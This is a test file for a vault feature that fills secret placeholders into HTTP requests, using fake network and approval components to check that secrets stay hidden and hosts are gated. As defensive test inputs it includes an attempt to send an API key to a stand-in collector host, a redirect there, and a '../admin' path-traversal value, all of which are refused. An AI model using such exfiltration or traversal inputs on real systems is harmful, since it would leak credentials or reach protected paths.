// @ts-check
// Vault items by placeholder (core/vault/use.js), with fakes only: a fake DNS lookup and transport that record what would have gone where, a fake Gate, and a fake kernel that answers which
// agent holds "Can use it, without seeing it" on which item. What these prove: vault.use.find shows names and plain values and never a secret; placeholders are filled in the url, headers and body;
// every secret is hidden in the answer, encoded forms too; an unknown or ungranted placeholder refuses the whole request; a new host waits for the person, then works; a host off the list, plain
// http and a bare address never get a secret; scripts get nothing unless the item is Allowed in scripts, under canonical names; no audit row, event or log line carries a value; and an agent
// running for a member reaches nothing of the owner's. Every value is a sample.

import "../../scripts/mac-test-guard.mjs";
import { test } from "node:test";
import assert from "node:assert/strict";
import crypto from "node:crypto";
import fs from "node:fs";
import path from "node:path";
import { open, migrate } from "../store/index.js";
import { Vault, MIGRATIONS } from "./vault.js";
import * as saidTools from "./said.js";
import { register as registerRequests } from "./request.js";
import { register as registerUse, canon, hide } from "./use.js";
import { gateTools } from "./member-gate.js";
import { newIdentity, openFrom } from "./crypto.js";
import { SCRATCH } from "../../test/scratch.mjs";

const PUBLIC = "93.184.216.10";
const OWNER = "per_owner1";
const json = (status, body, headers = {}) => ({ status, headers: { "content-type": "application/json", ...headers }, body: Buffer.from(JSON.stringify(body)) });
const person = id => ({ actor: { kind: "person", id } });
const agentHop = id => ({ actor: { kind: "agent", id } });

/** A vault with vault.request, the placeholder tools, a fake network, a fake Gate and a fake kernel. `gated` registers every tool through the member gate. */
async function mk(t, { gated = false } = {}) {
  const home = fs.mkdtempSync(path.join(SCRATCH, "vyre-use-"));
  const db = open(path.join(home, "vyre.db"));
  migrate(db, "vault", MIGRATIONS);
  const events = /** @type {any[]} */ ([]), logs = /** @type {string[]} */ ([]);
  const v = new Vault({ db, dir: path.join(home, "vault"), config: { name: "northwind-box", vault: { keystore: "file" } }, emit: (type, p) => events.push({ type, p }), log: m => logs.push(String(m)) });
  t.after(() => { db.close(); fs.rmSync(home, { recursive: true, force: true }); });

  const net = { calls: /** @type {any[]} */ ([]), script: /** @type {(r: any) => any} */ (() => json(200, { ok: true })) };
  const lookup = async () => [{ address: PUBLIC, family: 4 }];
  const transport = async r => { net.calls.push({ host: r.url.hostname, path: r.url.pathname + r.url.search, address: r.address, method: r.method, headers: r.headers, body: r.body }); return net.script(r); };

  const gate = { items: new Map() };
  /** The Switchboard's answer for a thread: who asked its running turn, and whether a person is at it. @type {Map<string, { asker: string | null, attended: boolean }>} */ const turns = new Map();
  const call = async (tool, input) => {
    if (tool === "gate.offer") return { data: { name: input.name } };
    if (tool === "gate.request") { const id = `h${gate.items.size + 1}`; gate.items.set(id, { id, state: "held", via: input.via, kind: input.kind, draft: input.content, final: null, by: null }); return { data: { id, state: "held", message: `Held as ${id}` } }; }
    if (tool === "gate.get") { const it = gate.items.get(input.id); return it ? { data: { ...it } } : { error: { code: "not_found", message: "nothing" } }; }
    if (tool === "threads.turn-asker") return { data: turns.get(input.thread) || { asker: null, attended: false } };
    return { error: { code: "no_such_tool", message: tool } };
  };
  const approveGate = id => { const it = gate.items.get(id); it.state = "sending"; it.final = it.draft; it.by = OWNER; };

  // the kernel's answers: which agent holds Can use on which item, and whose chain a call carries
  const grants = new Set(), asks = new Set(), fills = new Set();
  /** @type {any} */ (v).access = {
    // the kernel's own vault grants (module releases, lent logins): none in this rig
    K: { owner: OWNER, space: "sp_test", vault: { grantsOn: () => [] }, chain: async meta => ({ hops: meta.hops || [] }) },
    items: () => [],
    modelName: (meta, caller) => String(meta.agent || (/(?:^|:)agent:([^:\s]+)/.exec(caller) || [])[1] || "assistant").toLowerCase(),
    // Can use: allow for vault.read; a held act: ask; a lent login: allow for vault.fill only
    effectFor: async (name, item, action) => (action === "vault.read" && grants.has(`${name}:${item}`) ? "allow" : action === "vault.read" && asks.has(`${name}:${item}`) ? "ask" : action === "vault.fill" && fills.has(`${name}:${item}`) ? "allow" : "deny"),
  };

  /** @type {Map<string, any>} */ const tools = new Map();
  const ctx0 = { kernel: { owner: OWNER, hasOtherMembers: async () => true, chain: async meta => ({ hops: meta.hops || [] }) }, tool: (name, def) => tools.set(name, def) };
  const ctx = gated ? gateTools(ctx0) : ctx0;
  const tool = (name, callers, description, input, run) => ctx.tool(name, { callers, description, input, run });
  const internal = (name, description, input, run) => tools.set(name, { internal: true, description, input, run });
  const said = saidTools.register({ vault: v, internal });
  const api = registerRequests({ vault: v, tool, internal, call, said, deps: { lookup, transport } });
  const use = registerUse({ vault: v, api, said, tool, emit: (type, p) => events.push({ type, p }) });
  t.after(() => api.stop());
  const run = (name, input, caller = "mcp:agent:kit", meta = {}) => tools.get(name).run(input, { caller, ...meta });
  const ask = (input, caller = "mcp:agent:kit", meta = {}) => run("vault.request", input, caller, meta);
  return { v, net, gate, approveGate, grants, asks, fills, turns, use, run, ask, events, logs, audit: () => v.auditTrail({ limit: 500 }).entries };
}

const SECRET = `nw_${crypto.randomBytes(12).toString("hex")}+/"q`;
const OTHER = `jm_${crypto.randomBytes(12).toString("hex")}`;
const ACCOUNT = "acct_northwind_042";

/** Two items: Northwind's CRM (a secret key, a plain account id, used with api.example.com) and Juniper's mail key (used with mail.example.com). */
async function items(r) {
  await r.v.put({ name: "northwind-crm", kind: "env-set", description: "Northwind Bakery CRM", fields: { NORTHWIND_API_KEY: SECRET, NORTHWIND_ACCOUNT_ID: ACCOUNT }, hosts: ["https://api.example.com"] }, "cli");
  await r.v.put({ name: "juniper-mail", kind: "secret", description: "Juniper Studio mail", fields: { value: OTHER }, hosts: ["https://mail.example.com"] }, "cli");
  await r.run("vault.use.set", { name: "northwind-crm", plain: ["northwind_account_id"] }, "cli");
}

test("canonical names: case and punctuation do not matter", () => {
  assert.equal(canon("Northwind CRM"), "NORTHWIND_CRM");
  assert.equal(canon("northwind-crm"), "NORTHWIND_CRM");
  assert.equal(canon(" northwind.crm "), "NORTHWIND_CRM");
});

test("vault.use.find returns item names, field names and plain values, and for a secret field only its name", async t => {
  const r = await mk(t);
  await items(r);
  r.grants.add("kit:northwind-crm");
  const got = await r.run("vault.use.find", { q: "northwind" });
  assert.equal(got.items.length, 1);
  const it = got.items[0];
  assert.equal(it.name, "northwind-crm");
  assert.deepEqual(it.used_with, ["api.example.com"]);
  assert.deepEqual(it.fields.find(f => f.name === "NORTHWIND_ACCOUNT_ID"), { name: "NORTHWIND_ACCOUNT_ID", plain: ACCOUNT });
  assert.deepEqual(it.fields.find(f => f.name === "NORTHWIND_API_KEY"), { name: "NORTHWIND_API_KEY", secret: true }, "no length, no last four, no hash");
  assert.ok(!JSON.stringify(got).includes(SECRET.slice(0, 12)), "the secret is nowhere in the answer, not even in part");
  assert.equal(it.placeholder, "{{vault:northwind-crm.NORTHWIND_API_KEY}}");
  // not shared with this agent: not found at all
  assert.equal((await r.run("vault.use.find", { q: "juniper" })).items.length, 0);
  // several matches all come back, so the agent can choose or ask
  r.grants.add("kit:juniper-mail");
  const both = await r.run("vault.use.find", {});
  assert.deepEqual(both.items.map(x => x.name).sort(), ["juniper-mail", "northwind-crm"]);
  assert.match(both.note, /Several items match/);
  assert.ok(!JSON.stringify(both).includes(OTHER));
  // another agent holds nothing
  assert.equal((await r.run("vault.use.find", {}, "mcp:agent:juno")).items.length, 0);
});

test("placeholders are filled in the url and headers on the server; the answer hides every form of the secret", async t => {
  const r = await mk(t);
  await items(r);
  r.grants.add("kit:northwind-crm");
  const b64 = Buffer.from(SECRET).toString("base64");
  r.net.script = () => json(200, { echoed: SECRET, b64, url: encodeURIComponent(SECRET), account: ACCOUNT, nested: [`Bearer ${SECRET}`] }, { "x-request-id": `id-${b64}` });
  const got = await r.ask({ method: "GET", url: "https://api.example.com/v1/orders?key={{vault:Northwind CRM.NORTHWIND_API_KEY}}&account={{ vault:northwind-crm.northwind_account_id }}",
    headers: { authorization: "Bearer {{vault:NORTHWIND_CRM.NORTHWIND_API_KEY}}" } });
  assert.equal(r.net.calls.length, 1);
  const sent = r.net.calls[0];
  assert.equal(sent.address, PUBLIC);
  assert.equal(sent.headers.authorization, `Bearer ${SECRET}`);
  assert.equal(sent.path, `/v1/orders?key=${encodeURIComponent(SECRET)}&account=${ACCOUNT}`);
  assert.equal(got.status, 200);
  assert.equal(got.body.echoed, "[hidden: NORTHWIND_API_KEY]");
  assert.equal(got.body.b64, "[hidden: NORTHWIND_API_KEY]", "base64 too");
  assert.equal(got.body.url, "[hidden: NORTHWIND_API_KEY]", "URL-encoded too");
  assert.deepEqual(got.body.nested, ["Bearer [hidden: NORTHWIND_API_KEY]"]);
  assert.equal(got.body.account, ACCOUNT, "a plain value is not hidden");
  assert.equal(got.headers["x-request-id"], "id-[hidden: NORTHWIND_API_KEY]");
  assert.ok(!JSON.stringify(got).includes(SECRET) && !JSON.stringify(got).includes(b64));
});

test("a placeholder in a body: the write waits at the Gate with no value on its card, and the person's yes sends exactly it with the value put in", async t => {
  const r = await mk(t);
  await items(r);
  r.grants.add("kit:northwind-crm");
  const held = await r.ask({ method: "POST", url: "https://api.example.com/v1/orders", body: { key: "{{vault:northwind-crm.NORTHWIND_API_KEY}}", note: "rye x2" } });
  assert.ok(held.held, "a write is held");
  assert.equal(r.net.calls.length, 0, "nothing sent before the yes");
  const card = r.gate.items.get(held.held).draft;
  assert.ok(!JSON.stringify(card).includes(SECRET), "the card carries the placeholder, never the value");
  r.approveGate(held.held);
  r.net.script = q => json(201, { got: JSON.parse(q.body).key });
  const sent = await r.run("vault.api.send", { id: held.held }, "module:gate");
  assert.equal(r.net.calls.length, 1);
  assert.equal(JSON.parse(r.net.calls[0].body).key, SECRET, "the value went in, JSON-escaped");
  assert.equal(sent.body.got, "[hidden: NORTHWIND_API_KEY]");
  // the agent's grant is asked again at the send: taken away, nothing goes
  const again = await r.ask({ method: "POST", url: "https://api.example.com/v1/orders", body: { key: "{{vault:northwind-crm.NORTHWIND_API_KEY}}", note: "rye x3" } });
  r.approveGate(again.held);
  r.grants.delete("kit:northwind-crm");
  await assert.rejects(r.run("vault.api.send", { id: again.held }, "module:gate"), /no item called northwind-crm/);
  assert.equal(r.net.calls.length, 1);
});

test("an unknown or ungranted placeholder refuses the whole request and names the field", async t => {
  const r = await mk(t);
  await items(r);
  r.grants.add("kit:northwind-crm");
  await assert.rejects(r.ask({ method: "GET", url: "https://api.example.com/v1/x", headers: { authorization: "Bearer {{vault:northwind-crm.NORTHWIND_API_KEY}}", "x-other": "{{vault:juniper-mail.VALUE}}" } }),
    e => /\{\{vault:juniper-mail\.VALUE\}\}: there is no item called juniper-mail that you may use/.test(e.message) && e.code === "not_found");
  await assert.rejects(r.ask({ method: "GET", url: "https://api.example.com/v1/x?k={{vault:no-such.KEY}}" }), /no item called no-such that you may use/, "unknown answers as ungranted does");
  await assert.rejects(r.ask({ method: "GET", url: "https://api.example.com/v1/x?k={{vault:northwind-crm.API_TOKEN}}" }), /northwind-crm has no field API_TOKEN; its fields are NORTHWIND_API_KEY, NORTHWIND_ACCOUNT_ID|NORTHWIND_ACCOUNT_ID, NORTHWIND_API_KEY/);
  assert.equal(r.net.calls.length, 0, "nothing was sent");
});

test("a new host waits for the person; their yes puts it on Used with and the same request then runs", async t => {
  const r = await mk(t);
  await items(r);
  r.grants.add("kit:northwind-crm");
  const req = { method: "GET", url: "https://hooks.example.org/v2/ping", headers: { "x-api-key": "{{vault:northwind-crm.NORTHWIND_API_KEY}}" } };
  const held = await r.ask(req);
  assert.equal(held.kind, "host");
  assert.match(held.held, /^vu_/);
  assert.match(held.message, /allow northwind-crm with hooks\.example\.org\. Nothing was sent/);
  assert.equal(r.net.calls.length, 0);
  const pending = r.use.pending();
  assert.deepEqual(pending.map(p => [p.item, p.host]), [["northwind-crm", "hooks.example.org"]]);
  assert.equal((await r.ask(req)).held, held.held, "asking again is the same one request");
  await r.use.approve(held.held, "cli");
  assert.deepEqual(r.use.pending(), []);
  const ok = await r.ask(req);
  assert.equal(ok.status, 200);
  assert.equal(r.net.calls.length, 1);
  assert.equal(r.net.calls[0].headers["x-api-key"], SECRET);
  assert.ok(r.events.some(e => e.type === "vault.use-asked") && r.events.some(e => e.type === "vault.use-allowed"));
});

test("a host off the list never gets a secret: declined stays off, a bare address, plain http and a redirect elsewhere are refused", async t => {
  const r = await mk(t);
  await items(r);
  r.grants.add("kit:northwind-crm");
  const key = { "x-api-key": "{{vault:northwind-crm.NORTHWIND_API_KEY}}" };
  const held = await r.ask({ method: "GET", url: "https://collector.example.net/grab", headers: key });
  await r.run("vault.use.set", { name: "northwind-crm", decline: held.held }, "cli");
  const after = await r.ask({ method: "GET", url: "https://collector.example.net/grab", headers: key });
  assert.ok(after.held, "still not on the list: held again, never sent");
  await assert.rejects(r.ask({ method: "GET", url: "http://api.example.com/v1/x", headers: key }), /never sent over plain http/);
  await assert.rejects(r.ask({ method: "GET", url: "https://93.184.216.34/v1/x", headers: key }), /never to a bare address/);
  r.net.script = () => ({ status: 302, headers: { location: "https://collector.example.net/grab" }, body: Buffer.alloc(0) });
  await assert.rejects(r.ask({ method: "GET", url: "https://api.example.com/v1/x", headers: key }), /redirected to another host/);
  assert.equal(r.net.calls.filter(c => c.host !== "api.example.com").length, 0, "no call ever reached a host off the list");
  // plain fields go anywhere
  r.net.script = () => json(200, { ok: true });
  const plain = await r.ask({ method: "GET", url: "https://status.example.org/acct/{{vault:northwind-crm.NORTHWIND_ACCOUNT_ID}}" });
  assert.equal(plain.status, 200);
  assert.equal(r.net.calls.at(-1).path, `/acct/${ACCOUNT}`);
});

test("scripts get nothing unless the item is Allowed in scripts; then every field, under its canonical name, sealed to the run's key", async t => {
  const r = await mk(t);
  await items(r);
  r.grants.add("kit:northwind-crm");
  r.grants.add("kit:juniper-mail");
  const box = newIdentity().box;
  await assert.rejects(r.run("vault.use.env", { items: ["Northwind CRM"], key: box.public, command: "deploy.sh" }), /northwind-crm is not allowed in scripts/);
  await r.run("vault.use.set", { name: "northwind-crm", scripts: true }, "cli");
  await r.run("vault.use.set", { name: "juniper-mail", scripts: true }, "cli");
  const got = await r.run("vault.use.env", { items: ["northwind-crm", "JUNIPER_MAIL"], key: box.public, command: "/usr/bin/deploy.sh" });
  assert.ok(!JSON.stringify(got).includes(SECRET) && !JSON.stringify(got).includes(OTHER), "the tool result carries no value");
  const opened = openFrom(box.private, got.box, "vault-run", "vault-run");
  assert.deepEqual(opened.env, { NORTHWIND_API_KEY: SECRET, NORTHWIND_ACCOUNT_ID: ACCOUNT, VALUE: OTHER });
  assert.deepEqual(opened.hidden.sort(), ["NORTHWIND_API_KEY", "VALUE"]);
  // only for a model's session, never another key type, never an item it may not use
  await assert.rejects(r.run("vault.use.env", { items: ["northwind-crm"], key: box.public }, "cli"), /for an agent's session/);
  await assert.rejects(r.run("vault.use.env", { items: ["northwind-crm"], key: "bm90IGEga2V5" }), /not one this Vyre can seal to/);
  await assert.rejects(r.run("vault.use.env", { items: ["northwind-crm"], key: box.public }, "mcp:agent:juno"), /no item called northwind-crm that you may use/);
  // a script setting can be turned off again with no proof
  await r.run("vault.use.set", { name: "northwind-crm", scripts: false }, "cli");
  await assert.rejects(r.run("vault.use.env", { items: ["northwind-crm"], key: box.public }), /not allowed in scripts/);
  assert.ok(r.audit().some(a => a.action === "use" && a.name === "northwind-crm" && a.ok && /run deploy\.sh/.test(a.why) && a.who === "agent:kit"), "the run is on the item's activity");
});

test("nothing logs a value: audit rows, events and log lines name items, agents and hosts only", async t => {
  const r = await mk(t);
  await items(r);
  r.grants.add("kit:northwind-crm");
  r.net.script = () => json(200, { echoed: SECRET });
  const key = { authorization: "Bearer {{vault:northwind-crm.NORTHWIND_API_KEY}}" };
  await r.ask({ method: "GET", url: "https://api.example.com/v1/x", headers: key }, "mcp:agent:kit", { hops: [person(OWNER), agentHop("ag_kit")] });
  const held = await r.ask({ method: "GET", url: "https://hooks.example.org/x", headers: key });
  await r.use.approve(held.held, "cli");
  await r.ask({ method: "POST", url: "https://api.example.com/v1/x", headers: key, body: { a: 1 } });
  await r.ask({ method: "GET", url: "https://api.example.com/v1/x?k={{vault:juniper-mail.VALUE}}" }).catch(() => {});
  await r.run("vault.use.set", { name: "northwind-crm", scripts: true }, "cli");
  await r.run("vault.use.env", { items: ["northwind-crm"], key: newIdentity().box.public, command: "sync" });
  r.net.script = () => { throw new Error(`socket closed after sending ${SECRET}`); };
  await assert.rejects(r.ask({ method: "GET", url: "https://api.example.com/v1/x", headers: key }), e => !e.message.includes(SECRET));
  const all = JSON.stringify({ audit: r.audit(), events: r.events, logs: r.logs });
  for (const v of [SECRET, OTHER, Buffer.from(SECRET).toString("base64"), encodeURIComponent(SECRET)]) assert.ok(!all.includes(v), "a value reached the audit, an event or the log");
  const uses = r.audit().filter(a => a.action === "use" && a.name === "northwind-crm");
  assert.ok(uses.some(a => a.ok && a.origin === "api.example.com" && a.who === "agent:kit" && /for per_owner1/.test(a.why)), "which agent, for which person, which host");
  assert.ok(uses.some(a => !a.ok && /held/.test(a.why)), "a refusal or hold is recorded too");
});

test("hide covers base64, URL-encoded and JSON forms with the field's own label", () => {
  const s = 'k"y+/=secret-value';
  const text = [s, Buffer.from(s).toString("base64"), encodeURIComponent(s), JSON.stringify(s).slice(1, -1)].join(" | ");
  assert.equal(hide(text, [{ value: s, label: "API_KEY" }]), Array(4).fill("[hidden: API_KEY]").join(" | "));
});

test("the asker's account: an agent running for member A finds and uses nothing of the owner's; the owner's own assistant finds the owner's items", async t => {
  const r = await mk(t, { gated: true });
  await items(r);
  r.grants.add("kit:northwind-crm");
  const memberA = { token: "tok-a", hops: [person("per_membera"), agentHop("ag_kit")] };
  await assert.rejects(r.run("vault.use.find", {}, "mcp:agent:kit", memberA), /this is the owner's vault/);
  await assert.rejects(r.ask({ method: "GET", url: "https://api.example.com/v1/x", headers: { authorization: "Bearer {{vault:northwind-crm.NORTHWIND_API_KEY}}" } }, "mcp:agent:kit", memberA), /this is the owner's vault/);
  await assert.rejects(r.run("vault.use.env", { items: ["northwind-crm"], key: newIdentity().box.public }, "mcp:agent:kit", { token: "tok-b", hops: [person("per_memberb"), agentHop("ag_kit")] }), /this is the owner's vault/);
  assert.equal(r.net.calls.length, 0);
  // the owner's own assistant, on a turn for the owner, has the owner's reach (names and plain values only)
  r.turns.set("th_owner", { asker: OWNER, attended: true });
  const own = await r.run("vault.use.find", {}, "mcp:agent:juno", { token: "tok-o", agent: "juno", agentKind: "assistant", thread: "th_owner", hops: [person(OWNER), agentHop("ag_juno")] });
  assert.deepEqual(own.items.map(x => x.name).sort(), ["juniper-mail", "northwind-crm"]);
  assert.ok(!JSON.stringify(own).includes(SECRET) && !JSON.stringify(own).includes(OTHER));
  // a named agent of the owner's still needs its own grant
  const named = await r.run("vault.use.find", {}, "mcp:agent:juno", { token: "tok-o", agent: "juno", agentKind: "agent", hops: [person(OWNER), agentHop("ag_juno")] });
  assert.equal(named.items.length, 0);
});

test("review A: the owner's assistant gets the owner's items only on a turn the owner is at, never on a Flow, run_as or job turn", async t => {
  const r = await mk(t);
  await items(r);
  const meta = thread => ({ agent: "juno", agentKind: "assistant", thread, hops: [person(OWNER), agentHop("ag_juno")] });
  r.turns.set("th_chat", { asker: OWNER, attended: true });
  r.turns.set("th_flow", { asker: OWNER, attended: false });   // a Flow step or a run_as run: the owner on its chain, nobody at it
  assert.equal((await r.run("vault.use.find", {}, "mcp:agent:juno", meta("th_chat"))).items.length, 2);
  assert.equal((await r.run("vault.use.find", {}, "mcp:agent:juno", meta("th_flow"))).items.length, 0);
  assert.equal((await r.run("vault.use.find", {}, "mcp:agent:juno", meta(undefined))).items.length, 0, "no thread: no turn to be at");
  r.turns.set("th_member", { asker: "per_membera", attended: true });
  assert.equal((await r.run("vault.use.find", {}, "mcp:agent:juno", meta("th_member"))).items.length, 0, "a turn someone else asked");
  await assert.rejects(r.ask({ method: "GET", url: "https://api.example.com/v1/x", headers: { "x-api-key": "{{vault:northwind-crm.NORTHWIND_API_KEY}}" } }, "mcp:agent:juno", meta("th_flow")), /no item called northwind-crm that you may use/);
});

test("review E: only allow is a grant; an ask, or a login lent to fill at a site, does not let an agent use an item", async t => {
  const r = await mk(t);
  await items(r);
  r.asks.add("kit:northwind-crm");
  r.fills.add("kit:juniper-mail");
  assert.equal((await r.run("vault.use.find", {})).items.length, 0);
  await assert.rejects(r.ask({ method: "GET", url: "https://api.example.com/v1/x?k={{vault:northwind-crm.NORTHWIND_API_KEY}}" }), /no item called northwind-crm that you may use/);
  await assert.rejects(r.ask({ method: "GET", url: "https://mail.example.com/v1/x?k={{vault:juniper-mail.VALUE}}" }), /no item called juniper-mail that you may use/);
  assert.equal(r.net.calls.length, 0);
});

test("review C: an agent has at most five host questions waiting; a host over 100 characters is refused; a rentable domain is marked", async t => {
  const r = await mk(t);
  await items(r);
  r.grants.add("kit:northwind-crm");
  const key = { "x-api-key": "{{vault:northwind-crm.NORTHWIND_API_KEY}}" };
  for (let n = 1; n <= 5; n++) assert.ok((await r.ask({ method: "GET", url: `https://h${n}.example.org/x`, headers: key })).held);
  await assert.rejects(r.ask({ method: "GET", url: "https://h6.example.org/x", headers: key }), /5 are waiting/);
  assert.equal(r.use.pending().length, 5);
  r.v.db.prepare("DELETE FROM vault_use_requests").run();
  await assert.rejects(r.ask({ method: "GET", url: `https://${"a".repeat(60)}.${"b".repeat(40)}.example.org/x`, headers: key }), /longer than 100 characters/);
  await r.ask({ method: "GET", url: "https://northwind-sync.workers.dev/x", headers: key });
  assert.deepEqual(r.use.pending().map(p => [p.host, p.shared === true]), [["northwind-sync.workers.dev", true]]);
});

test("review D: compressed answers, numbers, deep encodings, a cut answer and a burst of uses never let a secret through", async t => {
  const r = await mk(t);
  await items(r);
  await r.v.put({ name: "northwind-pin", kind: "secret", fields: { value: "48151623" }, hosts: ["https://api.example.com"] }, "cli");
  r.grants.add("kit:northwind-crm"); r.grants.add("kit:northwind-pin");
  const key = { "x-api-key": "{{vault:northwind-crm.NORTHWIND_API_KEY}}", "x-pin": "{{vault:northwind-pin.VALUE}}" };
  const req = { method: "GET", url: "https://api.example.com/v1/x", headers: key };
  await assert.rejects(r.ask({ ...req, headers: { ...key, "accept-encoding": "gzip" } }), /accept-encoding is set by the connection/);
  r.net.script = () => ({ status: 200, headers: { "content-type": "application/json", "content-encoding": "gzip" }, body: Buffer.from("x") });
  await assert.rejects(r.ask(req), /gzip-encoded.*withheld/);
  assert.equal(r.net.calls.at(-1).headers["accept-encoding"], "identity");
  const forms = {
    pin: 48151623,
    basic: Buffer.from(`alex:${SECRET}`).toString("base64"),
    offset1: Buffer.from(`x${SECRET}`).toString("base64url"),
    html: SECRET.replace(/"/g, "&quot;"),
    unicode: [...SECRET].map(c => `\\u${c.charCodeAt(0).toString(16).padStart(4, "0")}`).join(""),
    twice: encodeURIComponent(encodeURIComponent(SECRET)),
    reversed: [...SECRET].reverse().join(""),
    hex: Buffer.from(SECRET).toString("hex").toUpperCase(),
  };
  r.net.script = () => json(200, forms);
  const got = await r.ask(req);
  assert.equal(got.body.pin, "[hidden: VALUE]", "a number is hidden too");
  for (const k of ["html", "unicode", "twice", "reversed", "hex"]) assert.equal(got.body[k], "[hidden: NORTHWIND_API_KEY]", k);
  for (const k of ["basic", "offset1"]) assert.match(got.body[k], /\[hidden: NORTHWIND_API_KEY\]/, `${k}: the secret's base64 at its offset`);
  const text = JSON.stringify(got);
  for (const v of Object.values(forms)) assert.ok(!text.includes(String(v)), String(v).slice(0, 12));
  // the transport cut the answer in the middle of the secret
  r.net.script = () => ({ status: 200, headers: { "content-type": "text/plain" }, body: Buffer.from(`ok ${"x".repeat(50)} ${SECRET.slice(0, 15)}`), truncated: true });
  const cut = await r.ask(req);
  assert.ok(!String(cut.body).includes(SECRET.slice(0, 8)), "no piece of the secret is left at the cut");
  // a burst: past the per-minute rate the item rests, and that is an alert in the audit
  r.use.perMinute = 2;
  r.use.uses.clear();
  r.net.script = () => json(200, { ok: true });
  await r.ask(req); await r.ask(req);
  await assert.rejects(r.ask(req), e => e.code === "rate_limited");
  assert.ok(r.audit().some(a => a.action === "use" && !a.ok && /more than 2 uses in a minute/.test(a.why)));
  assert.ok(r.events.some(e => e.type === "vault.refused"));
});

test("small: an ungranted item with the same canonical name is not revealed; a value with .. never goes into an address", async t => {
  const r = await mk(t);
  await items(r);
  await r.v.put({ name: "northwind_crm", kind: "secret", fields: { value: OTHER }, hosts: ["https://api.example.com"] }, "cli");
  r.grants.add("kit:northwind-crm");
  const ok = await r.ask({ method: "GET", url: "https://api.example.com/v1/x", headers: { "x-api-key": "{{vault:northwind-crm.NORTHWIND_API_KEY}}" } });
  assert.equal(ok.status, 200, "the one this agent may use is used; the other is not mentioned");
  await r.v.put({ name: "northwind-path", kind: "env-set", fields: { SEGMENT: "../admin" }, hosts: ["https://api.example.com"] }, "cli");
  await r.run("vault.use.set", { name: "northwind-path", plain: ["SEGMENT"] }, "cli");
  r.grants.add("kit:northwind-path");
  await assert.rejects(r.ask({ method: "GET", url: "https://api.example.com/v1/{{vault:northwind-path.SEGMENT}}/list" }), /has "\.\." in it/);
  assert.equal(r.net.calls.length, 1);
});
